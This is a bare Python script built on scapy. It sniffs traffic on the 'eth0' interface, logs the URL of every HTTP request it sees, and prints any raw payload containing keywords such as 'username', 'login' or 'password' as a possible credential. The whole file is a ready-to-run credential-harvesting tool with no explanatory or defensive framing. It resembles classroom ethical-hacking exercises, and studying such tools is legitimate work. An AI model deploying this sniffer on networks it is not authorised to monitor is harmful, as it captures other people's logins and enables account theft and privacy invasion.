#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

def login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "uname"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load

def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))

        login = login_info(packet)
        if login:
            print("\n\n[+] possible username/password > " + str(login) + "\n\n")

sniff("eth0")
